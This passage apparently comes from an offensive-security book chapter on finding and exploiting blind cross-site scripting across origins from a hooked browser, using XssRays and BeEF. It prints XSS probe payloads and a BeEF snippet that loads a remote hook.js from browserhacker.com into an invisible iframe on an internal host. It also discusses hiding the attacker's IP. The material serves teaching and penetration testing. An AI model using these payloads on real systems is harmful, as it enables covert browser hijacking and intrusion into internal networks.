
Cross-site Scripting (XSS) vulnerabilities were analyzed in Chapter 2, providing examples of instances of this bug category in real-life web applications. This section now focuses on detecting XSS vulnerabilities entirely from the hooked browser.

### Cross-origin Blind Cross-site Scripting Detection

There are two actions that you need to be able to perform to discover XSS vulnerabilities from a cross-origin position. You need to be able to send the attack, and then determine if the attack was successful.

After discovering the `http://192.168.1.1/chapter?id=1` URL using the method outlined in the previous sections, the next step is checking if the id parameter is vulnerable to XSS. To achieve this, load the URL in an IFrame, and append a classic XSS string to the parameter value. The result will be:

``` 
<iframe src="http://192.168.1.1/chapter?id=1 
  %3Cscript%3Ealert(1)%3C%2Fscript%3E">
```

When this IFrame is appended to the hooked-page DOM, the cross-origin URL is loaded. If the resource is vulnerable to either Reflected or Stored XSS, there will potentially be a pop-up. Obviously you need a way to know if your XSS vector is triggered or not. Because the IFrame is injected in a hooked page, you can’t directly see the pop-up. In fact, it will be the victim that would see it, and if one of your objectives is stealth you definitely don’t want this to happen!

This idea of identifying XSS flaws by loading resources to be tested in IFrames was expanded by Gareth Heyes in 2009, with the creation of XssRays.23 XssRays is a pure JavaScript XSS scanner. In a nutshell, XssRays retrieves all the links and forms of a web page, and loads all these discovered resources in IFrames appending XSS vectors to both the resource paths and its parameters.

Back in 2009, it was possible to achieve child-to-parent IFrame communication using the URI fragment identifier (#), even in cross-origin scenarios. Nowadays, modern browsers have patched this vulnerability. In fact, you may class this flaw as an SOP violation issue because, according to the SOP, a cross-origin resource loaded into an IFrame shouldn’t be able to communicate with the top-level window.

The fact that XssRays was written entirely in JavaScript makes it a good candidate to be used directly from the hooked browser itself. It’s possible to use the old XssRays logic in modern browsers by replacing the use of the patched fragment identifier bypass. The new payload needs to have a more sophisticated, SOP-friendly approach. That is, when a successful XSS vulnerability is discovered, the attacker needs to be notified without conflicting with the SOP.

The new payload updates the IFrame location to a resource known by the attacker, for example a handler on your server. Revisiting the previous example, the new vector will look like:

``` 
<iframe src="http://192.168.1.1/chapter?id=1%3Cscript%3Elocation%3D'http%3A  
%2F%2Fbrowserhacker.com%2Fxssrays%3Fdetails%3D....'%3C%2Fscript%3E">
```

If the attack is executed successfully, a GET request will be created pointing to the http://browserhacker.com/xssrays resource, together with details about the XSS vulnerability. This approach produces results devoid of false positives, because the handler on the server will only receive a GET request if the instructions were executed. The vulnerability must have already been exploited for the notification to occur.

The improved variant of XssRays is included in BeEF, and its logic can be injected into a hooked browser to check both same and cross-origin resources for XSS vulnerabilities. [Figure 9-15](#c09.html#figure9-15) shows a diagram that walks through how XssRays works in BeEF:

 start figure 

[**Figure 9-15:**](#c09.html#figureanchor9-15) XssRays’ high-level architecture

![c09f015.tif](image_fi/662090c09/c09f015.png)

 end figure 

There is no reason why XssRays could not be used same-origin to discover XSS vulnerabilities. However, this will be of limited value because you can access the entire origin without butting up against SOP restrictions anyway. An XSS vulnerability same-origin doesn’t necessarily provide more advantage when trying to move around an infrastructure.

Cross-origin detection of XSS vulnerabilities can be particularly useful through expanding the attack surface. The indirect exploitation of XSS vulnerabilities on a web server not routable from the Internet can be very valuable to you. The new target may have been assumed inaccessible by the organization and, as a result, have an immature security posture.

If you are able to find an XSS vulnerability in a cross-origin resource, nothing prevents you from hooking a browser in the context of that resource as well. Depending on your needs, you can either load it inside a hidden IFrame in the already hooked page, or open a new pop-up/pop-under window as discussed in Chapter 3. You will explore hooking the newly covered origin in the following sections.

Hiding your IP address on the Internet is another advantage of cross-origin detection of XSS vulnerabilities. The resources are not loaded from the attacker’s location, but they are loaded from the hooked browser. This results in the target’s IP address being logged by the web application. Remember, this characteristic applies to every activity performed from the hooked browser, which is the beachhead for launching (mostly) anonymous attacks.

### Cross-origin Blind Cross-site Scripting Exploitation

Currently you have one hooked origin via a hooked browser that resides on the internal network. Let’s assume this initial origin is accessible via the Internet. You have also detected a non-routable web application with an XSS vulnerability. Your next step is to gain access to the origin, which is actually quite simple.

All that is needed is another hook within the newly discovered origin. It is important not to confuse hooked browsers with hooked origins. A hooked browser must have at least one hooked origin and a hooked origin must have at least one hooked browser. It is common for this to be a one-to-one mapping. You may have hooked an origin in the victim browser, which means you have one browser and one origin hooked. If you were to create a hooked IFrame (within the DOM of the previously hooked origin) to another origin, that would mean two origins are hooked within the same browser. Hooking two browsers (or more) on the same-origin is also possible. This is what happens when a framework hooks multiple browsers via an XSS vulnerability.

Let’s delve into the process of gaining access to the new origin. Following on from the previous XssRays example, hooking the `http://192.168.1.1/chapter?id=1` vulnerable resource inside a hidden IFrame with BeEF is performed by executing the following two lines of JavaScript:

``` 
var i = beef.dom.createInvisibleIframe();
i.setAttribute(
  'src', 
  "http://192.168.1.1/chapter?id=1"+
  "<script src='http://browserhacker.com/hook.js'></script>");
```

Having exploited an XSS vulnerability to hook the new origin, you now have indirect access. Because it is non-routable, all communication must go via the hooked browser. This blind hooking of the origin has provided the attacker access to an internal web application that was never thought to be accessible from the Internet.

Now a browser tunneling proxy can be used to launch further attacks at the web server. You will learn more about these attacking methods in the following sections.

### Cross-site Scripting Filter Evasion

Most modern browsers implement XSS filtering controls by default and they can cause a reduction in reliability for cross-origin hooking. Bypasses in these measures will continue to be a virtual arms race, but there is likely to be one available for your hooked browser.
